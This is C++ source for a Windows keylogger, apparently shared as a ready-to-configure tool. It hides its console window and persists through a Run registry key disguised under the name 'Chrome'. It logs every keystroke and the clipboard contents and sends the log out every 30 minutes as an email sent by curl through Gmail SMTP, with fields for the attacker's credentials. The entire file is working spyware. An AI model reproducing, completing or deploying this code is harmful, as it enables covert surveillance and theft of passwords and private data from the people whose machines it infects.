#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <stdlib.h>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>
#include <tchar.h>
#include <Lmcons.h>
#include <iostream> 

#pragma warning(disable : 4996)
using namespace std; //I have in my habit using that

//U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
const string exe_name = "keylogger.exe"; //Make sure its same as name of your file, else autostart and autoinstall 
const string LogFileName = "data.th";
const string EmailFrom = "example@gmail.com";
const string EmailFromPassword = "YourPassowrd";
const string EmailTo = "example@gmail.com";
const bool IsWindowHidden = true;
const bool LogClipboard = true;
const bool RemoveLogsAfterSend = true; //It will remove Logs ONLY when sending log will be sucessfully
const float FrequencyOfSendingLogs = 30; //In Minutes


int send() {
	string cmd = "curl smtp://smtp.gmail.com:587 --ssl-reqd -v --mail-from \\\"" + EmailFrom + "\\\" --mail-rcpt \\\"" + EmailTo + "\\\" --ssl --upload-file %temp%\\" + LogFileName + " -u " + EmailFrom + ":" + EmailFromPassword + " -k --anyauth";
	int info = system(cmd.c_str());
	return info;
}
inline bool filexits(const string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}
string GetDirectory() {
	string cmd3;
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	char letter[UNLEN + 1];
	GetSystemDirectory(letter, sizeof(letter));

	cmd3 = letter[0];
	cmd3 += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\";

	return cmd3;
}
void autostart() {
	string cmd = GetDirectory();
	cmd += exe_name;
	if (!filexits(cmd.c_str())) {

		string cmd2 = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d " + cmd;

		system(cmd2.c_str());

		fstream file;
		file.open("temp.bat", ios::out);
		file << "taskkill /IM " + exe_name + " /F\n"
			<< "move " + exe_name + " %temp%\n"
			<< "start  %temp%\\" + exe_name
			<< "\ndel temp.bat"
			<< "\nexit";

		file.close();
		system("start temp.bat");

	}
}


void LOG(string input) {
	fstream LogFile;
	LogFile.open(LogFileName, fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}

//special chars
bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG(" #SPACE# ");
		return true;
	case VK_RETURN:
		LOG("\n#ENTER# ");
		return true;
	case '.':
		LOG(".");
		return true;
	case VK_SHIFT:
		LOG(" #SHIFT# ");
		return true;
	case VK_BACK:
		LOG(" #BACKSPACE# ");
		return true;
	case VK_RBUTTON:
		LOG(" #R_CLICK# ");
		return true;
	case VK_CAPITAL:
		LOG(" #CAPS_LOCK# ");
		return true;
	case VK_TAB:
		LOG(" #TAB# ");
		return true;
	case VK_UP:
		LOG(" #UP_ARROW# ");
		return true;
	case VK_DOWN:
		LOG(" #DOWN_ARROW# ");
		return true;
	case VK_LEFT:
		LOG(" #LEFT_ARROW# ");
		return true;
	case VK_RIGHT:
		LOG(" #RIGHT_ARROW# ");
		return true;
	case VK_CONTROL:
		LOG(" #CONTROL_ARROW# ");
		return true;
	case VK_MENU:
		LOG(" #ALT# ");
		return true;
	default:
		return false;
	}
}

HANDLE clip = 0;
char* buff;
string buffstr = "";
void ClipBoard() {
	   
		OpenClipboard(NULL);

		if (IsClipboardFormatAvailable(CF_TEXT))
		{
			clip = GetClipboardData(CF_TEXT);
		}
		else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
		{
			clip = GetClipboardData(CF_UNICODETEXT);
		}
		CloseClipboard();
		buff = (char*)clip;
		if (buff != buffstr) {
			cout << buff<<endl;
			buffstr = buff;
			LOG(" #CLIPBOARD#> ");
			LOG(buffstr);
			LOG(" <#CLIPBOARD# ");
		}
}

int main()
{
	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
	fstream LogFile;
	//To make sure  LogFile is created
	LogFile.open(GetDirectory() + LogFileName, ios::out);
	LogFile.close();
	//Sleep because pc after boot can haven't connected to internet yet
	Sleep(500);

	autostart();

	char KEY = 'x';
	bool IsOnlyOneTime = true;

	time_t t;
	struct tm* tt;
	time(&t);
	tt = localtime(&t);

		//Log at start of program
		LogFile.open(LogFileName, fstream::app);
		LogFile << endl << "###" << asctime(tt);
		LogFile.close();
		send();

		time_t one=clock();
		
	 while (true) {
		 time_t two = clock();
		 double time1 = (double)(two - one) / CLOCKS_PER_SEC;
		 if (time1 / 60 >= FrequencyOfSendingLogs)
		 {
			 one = clock();
			 time(&t);
			 tt = localtime(&t);
			 LogFile.open(LogFileName, fstream::app);
			 LogFile << endl << "#|#" << asctime(tt);
			 LogFile.close();

			 int info = send();
			 if (RemoveLogsAfterSend && info == 0)
				 remove(LogFileName.c_str());
		 }

		//Log Clipboard
		if (LogClipboard) ClipBoard();
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			// Logging chars
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					LogFile.open(LogFileName, fstream::app);
					LogFile << char(KEY);
					LogFile.close();
				}
			}
		}
	}

	return 0;
}
